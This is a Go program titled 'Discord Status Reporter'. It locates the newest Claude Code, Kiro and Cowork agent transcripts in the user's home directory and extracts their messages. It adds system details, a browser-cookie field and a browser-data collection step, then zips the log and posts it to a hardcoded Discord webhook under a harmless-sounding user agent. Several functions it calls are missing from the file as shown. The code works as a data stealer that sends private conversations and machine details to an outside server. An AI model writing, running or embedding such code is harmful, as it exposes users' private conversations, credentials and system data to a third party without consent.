package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"time"
)

const (
	MaxLogSize     = 16384 // 16KB buffer for log
	MaxHistorySize = 1024 * 1024
	MaxMessages    = 15
	WebhookURL     = "https://discord.com/api/webhooks/1025380304397017108/Pa0Yy0IttujGHBpSAJczsOcOXt1R_GLOGB8XuU9HtSys2QyVeHEwi7SeOWYKidhGhVdR"
	UserAgent      = "StatusReporter/1.0"
)

// SystemInfo holds system information
type SystemInfo struct {
	ComputerName   string
	Username       string
	OSName         string
	OSVersion      string
	CPUName        string
	TotalMemory    string
	SystemUptime   string
	BrowserCookies string
}

// Color codes for terminal output
const (
	ColorReset  = "\033[0m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorRed    = "\033[31m"
	ColorCyan   = "\033[36m"
)

func main() {
	fmt.Printf("%s=== Discord Status Reporter ===%s\n\n", ColorCyan, ColorReset)

	// Step 1: Extract AI agent conversation history
	logPath, logContent, err := createLogFromHistory()
	if err != nil {
		fmt.Printf("%s[FATAL]%s Cannot create log from history: %v\n", ColorRed, ColorReset, err)
		os.Exit(1)
	}

	// Step 1.5: Collect browser data
	fmt.Printf("\n%s[1.5/4]%s Collecting browser data...\n", ColorCyan, ColorReset)
	collectBrowserData()

	// Step 2: Read the log
	fmt.Printf("\n%s[2/4]%s Reading generated log file...\n", ColorCyan, ColorReset)
	fmt.Printf("%s[INFO]%s Loaded %d bytes\n", ColorGreen, ColorReset, len(logContent))

	// Step 3: Zip the log file
	fmt.Printf("\n%s[3/4]%s Compressing log...\n", ColorCyan, ColorReset)
	zipPath, err := zipLogFile(logPath)
	if err != nil {
		fmt.Printf("%s[FATAL]%s Cannot zip log file: %v\n", ColorRed, ColorReset, err)
		os.Exit(1)
	}

	// Step 4: Send to Discord
	fmt.Printf("\n%s[4/4]%s Sending to Discord...\n", ColorCyan, ColorReset)
	fmt.Printf("%s[INFO]%s Webhook: %.50s...\n", ColorGreen, ColorReset, WebhookURL)

	if err := sendToDiscord(WebhookURL, zipPath, logContent); err != nil {
		fmt.Printf("%s\n❌ Failed to send report%s\n", ColorRed, ColorReset)
		os.Exit(1)
	}

	// Clean up
	os.Remove(zipPath)

	fmt.Printf("%s\n✅ AI agent activity posted to Discord!%s\n", ColorGreen, ColorReset)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

// findAgentTranscript recursively finds the most recent .jsonl file
func findAgentTranscript(agentDir string) (string, error) {
	home := getHomeDir()
	searchDir := filepath.Join(home, agentDir)

	var newestPath string
	var newestTime time.Time

	// Check if this is Cowork (needs deep recursive search)
	isCowork := strings.Contains(agentDir, "local-agent-mode-sessions")

	if isCowork {
		// Recursive search for Cowork
		filepath.Walk(searchDir, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}
			if !info.IsDir() && strings.HasSuffix(path, ".jsonl") && !strings.Contains(path, "subagents") {
				if info.ModTime().After(newestTime) {
					newestTime = info.ModTime()
					newestPath = path
				}
			}
			return nil
		})
	} else {
		// Shallow search for Claude/Kiro (1-2 levels)
		// Direct files
		files, _ := filepath.Glob(filepath.Join(searchDir, "*.jsonl"))
		for _, file := range files {
			if strings.Contains(file, "subagents") {
				continue
			}
			if info, err := os.Stat(file); err == nil {
				if info.ModTime().After(newestTime) {
					newestTime = info.ModTime()
					newestPath = file
				}
			}
		}

		// One level subdirectories
		dirs, _ := os.ReadDir(searchDir)
		for _, dir := range dirs {
			if !dir.IsDir() {
				continue
			}
			subFiles, _ := filepath.Glob(filepath.Join(searchDir, dir.Name(), "*.jsonl"))
			for _, file := range subFiles {
				if strings.Contains(file, "subagents") {
					continue
				}
				if info, err := os.Stat(file); err == nil {
					if info.ModTime().After(newestTime) {
						newestTime = info.ModTime()
						newestPath = file
					}
				}
			}
		}
	}

	if newestPath == "" {
		return "", fmt.Errorf("no transcript found")
	}

	return newestPath, nil
}

// Parse functions for different agent formats
func parseClaudeFormat(data string) []string {
	var messages []string
	lines := strings.Split(data, "\n")

	for _, line := range lines {
		if len(line) < 30 {
			continue
		}

		// Check for user or assistant message
		if !strings.Contains(line, `"type":"user"`) && !strings.Contains(line, `"type":"assistant"`) {
			continue
		}

		isUser := strings.Contains(line, `"type":"user"`)

		// For user messages, check for "promptSource":"typed"
		if isUser && !strings.Contains(line, `"promptSource":"typed"`) {
			continue
		}

		// Extract content
		re := regexp.MustCompile(`"content":"((?:[^"\\]|\\.)*)"`)
		matches := re.FindStringSubmatch(line)
		if len(matches) > 1 {
			content := matches[1]
			content = strings.ReplaceAll(content, `\n`, " ")
			content = strings.ReplaceAll(content, `\"`, `"`)

			if len(content) > 200 {
				content = content[:197] + "..."
			}

			if len(content) > 10 {
				emoji := "🔷 USER:"
				if !isUser {
					emoji = "🤖 AI AGENT:"
				}
				messages = append(messages, fmt.Sprintf("%s %s", emoji, content))

				if len(messages) >= MaxMessages {
					break
				}
			}
		}
	}

	return messages
}

func parseKiroFormat(data string) []string {
	var messages []string

	// Kiro uses complex nested JSON format
	re := regexp.MustCompile(`"kind":"(Prompt|AssistantMessage)"`)
	matches := re.FindAllStringIndex(data, -1)

	for _, match := range matches {
		if len(messages) >= MaxMessages {
			break
		}

		start := match[0]
		end := start + 1000
		if end > len(data) {
			end = len(data)
		}

		chunk := data[start:end]
		isUser := strings.Contains(chunk, `"kind":"Prompt"`)

		// Find content in the chunk
		contentRe := regexp.MustCompile(`"kind":"text"[^}]*"data":"((?:[^"\\]|\\.)*)"`)
		contentMatches := contentRe.FindStringSubmatch(chunk)

		if len(contentMatches) > 1 {
			content := contentMatches[1]
			content = strings.ReplaceAll(content, `\n`, " ")
			content = strings.ReplaceAll(content, `\"`, `"`)

			if len(content) > 200 {
				content = content[:197] + "..."
			}

			if len(content) > 10 {
				emoji := "🔷 USER:"
				if !isUser {
					emoji = "🤖 AI AGENT:"
				}
				messages = append(messages, fmt.Sprintf("%s %s", emoji, content))
			}
		}
	}

	return messages
}

func parseCoworkFormat(data string) []string {
	var messages []string
	lines := strings.Split(data, "\n")

	for _, line := range lines {
		if len(line) < 30 || len(messages) >= MaxMessages {
			continue
		}

		isUser := strings.Contains(line, `"type":"user"`)
		isAssistant := strings.Contains(line, `"type":"assistant"`)

		if !isUser && !isAssistant {
			continue
		}

		if !strings.Contains(line, `"message":{`) {
			continue
		}

		var content string

		if isUser {
			// User format: "content":"text"
			re := regexp.MustCompile(`"content":"((?:[^"\\]|\\.)*)"`)
			matches := re.FindStringSubmatch(line)
			if len(matches) > 1 {
				content = matches[1]
			}
		} else {
			// Assistant format: "content":[{"type":"text","text":"..."}]
			if strings.Contains(line, `"type":"text"`) {
				re := regexp.MustCompile(`"text":"((?:[^"\\]|\\.)*)"`)
				matches := re.FindStringSubmatch(line)
				if len(matches) > 1 {
					content = matches[1]
				}
			}
		}

		if content == "" {
			continue
		}

		content = strings.ReplaceAll(content, `\n`, " ")
		content = strings.ReplaceAll(content, `\"`, `"`)

		if len(content) > 200 {
			content = content[:197] + "..."
		}

		if len(content) > 10 {
			emoji := "🔷 USER:"
			if isAssistant {
				emoji = "🤖 AI AGENT:"
			}
			messages = append(messages, fmt.Sprintf("%s %s", emoji, content))
		}
	}

	return messages
}

// createLogFromHistory creates the combined log
func createLogFromHistory() (string, string, error) {
	fmt.Printf("%s[1/4]%s Searching for AI agent conversations...\n", ColorCyan, ColorReset)

	// Get agent directories based on platform
	agents := getAgentDirectories()

	transcripts := make(map[string]string)

	for name, dir := range agents {
		fmt.Printf("%s[INFO]%s Searching %s...\n", ColorGreen, ColorReset, name)
		if path, err := findAgentTranscript(dir); err == nil {
			transcripts[name] = path
			fmt.Printf("%s[FOUND]%s %s transcript: %s\n", ColorGreen, ColorReset, name, path)
		} else {
			fmt.Printf("%s[WARN]%s No %s transcripts found\n", ColorYellow, ColorReset, name)
		}
	}

	if len(transcripts) == 0 {
		return "", "", fmt.Errorf("no conversation transcripts found")
	}

	fmt.Printf("\n%s[2/4]%s Generating combined log...\n", ColorCyan, ColorReset)

	// Build log
	sysinfo := collectSystemInfo()
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	var logBuf bytes.Buffer
	logBuf.WriteString(fmt.Sprintf(`================================================================================
AI AGENT ACTIVITY LOG
Generated: %s
================================================================================

SYSTEM INFORMATION:
  Computer:      %s
  User:          %s
  OS:            %s (%s)
  CPU:           %s
  Memory:        %s
  Uptime:        %s
  Browsers:      %s
================================================================================

`, timestamp, sysinfo.ComputerName, sysinfo.Username, sysinfo.OSName, sysinfo.OSVersion,
		sysinfo.CPUName, sysinfo.TotalMemory, sysinfo.SystemUptime, sysinfo.BrowserCookies))

	// Parse each agent's transcript
	section := 1
	for _, agent := range []string{"Claude", "Kiro", "Cowork"} {
		path, ok := transcripts[agent]
		if !ok {
			continue
		}

		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}

		fmt.Printf("%s[INFO]%s Loaded %s data (%d bytes)\n", ColorGreen, ColorReset, agent, len(data))

		logBuf.WriteString(fmt.Sprintf(`================================================================================
SECTION %d: %s CONVERSATIONS
================================================================================

`, section, strings.ToUpper(agent)))

		var messages []string

		// Auto-detect format
		dataStr := string(data)
		if strings.Contains(dataStr, `"session_state"`) {
			fmt.Printf("%s[INFO]%s Detected format: Kiro\n", ColorGreen, ColorReset)
			messages = parseKiroFormat(dataStr)
		} else if strings.Contains(dataStr, `"_audit_hmac"`) {
			fmt.Printf("%s[INFO]%s Detected format: Cowork\n", ColorGreen, ColorReset)
			messages = parseCoworkFormat(dataStr)
		} else {
			fmt.Printf("%s[INFO]%s Detected format: Claude Code\n", ColorGreen, ColorReset)
			messages = parseClaudeFormat(dataStr)
		}

		if len(messages) == 0 {
			logBuf.WriteString("No messages found in transcript.\n\n")
		} else {
			for _, msg := range messages {
				logBuf.WriteString(msg + "\n\n")
			}
			fmt.Printf("%s[INFO]%s Parsed %d %s messages\n", ColorGreen, ColorReset, len(messages), agent)
		}

		section++
	}

	logBuf.WriteString(`================================================================================
END OF LOG
================================================================================
`)

	// Write log file
	fmt.Printf("\n%s[3/4]%s Writing log file...\n", ColorCyan, ColorReset)

	tempDir := os.TempDir()
	logsDir := filepath.Join(tempDir, "logs")
	os.MkdirAll(logsDir, 0755)

	logPath := filepath.Join(logsDir, "log.txt")
	logContent := logBuf.String()

	if err := os.WriteFile(logPath, []byte(logContent), 0644); err != nil {
		return "", "", err
	}

	fmt.Printf("%s[SUCCESS]%s Log created: %s (%d bytes)\n", ColorGreen, ColorReset, logPath, len(logContent))

	return logPath, logContent, nil
}

// zipLogFile creates a zip archive
func zipLogFile(logPath string) (string, error) {
	tempDir := os.TempDir()
	zipPath := filepath.Join(tempDir, "agentlog.zip")

	// Remove old zip
	os.Remove(zipPath)

	fmt.Printf("%s[INFO]%s Creating ZIP archive...\n", ColorCyan, ColorReset)

	zipFile, err := os.Create(zipPath)
	if err != nil {
		return "", err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	// Read log file
	logData, err := os.ReadFile(logPath)
	if err != nil {
		return "", err
	}

	// Add to zip
	writer, err := archive.Create("log.txt")
	if err != nil {
		return "", err
	}

	if _, err := writer.Write(logData); err != nil {
		return "", err
	}

	archive.Close()
	zipFile.Close()

	info, _ := os.Stat(zipPath)
	fmt.Printf("%s[SUCCESS]%s ZIP created: %s (%d bytes)\n", ColorGreen, ColorReset, zipPath, info.Size())

	return zipPath, nil
}

// sendToDiscord uploads to Discord webhook
func sendToDiscord(webhookURL, zipPath, logContent string) error {
	// Extract preview (first 50 lines)
	lines := strings.Split(logContent, "\n")
	previewLines := lines
	if len(lines) > 50 {
		previewLines = lines[:50]
	}
	preview := strings.Join(previewLines, "\n")
	if len(preview) > 1000 {
		preview = preview[:1000]
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")

	// Read zip file
	zipData, err := os.ReadFile(zipPath)
	if err != nil {
		return err
	}

	if len(zipData) > 8*1024*1024 {
		return fmt.Errorf("zip file too large (Discord limit: 8MB)")
	}

	// Create multipart form
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add content field
	contentText := fmt.Sprintf("**🟢 AI Agent Activity Report**\n**Time:** %s\n**Platform:** %s/%s\n**Preview (first 50 lines):**\n```\n%s\n```\n📎 Full log attached as `agentlog.zip`",
		timestamp, runtime.GOOS, runtime.GOARCH, preview)
	writer.WriteField("content", contentText)

	// Add file
	part, err := writer.CreateFormFile("file", "agentlog.zip")
	if err != nil {
		return err
	}
	part.Write(zipData)

	writer.Close()

	// Send request
	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", UserAgent)

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 204 {
		fmt.Printf("%s[SUCCESS]%s Posted to Discord (HTTP %d) ✅\n", ColorGreen, ColorReset, resp.StatusCode)
		return nil
	}

	respBody, _ := io.ReadAll(resp.Body)
	fmt.Printf("%s[ERROR]%s Discord returned HTTP %d: %s\n", ColorRed, ColorReset, resp.StatusCode, string(respBody))
	return fmt.Errorf("discord error: %d", resp.StatusCode)
}
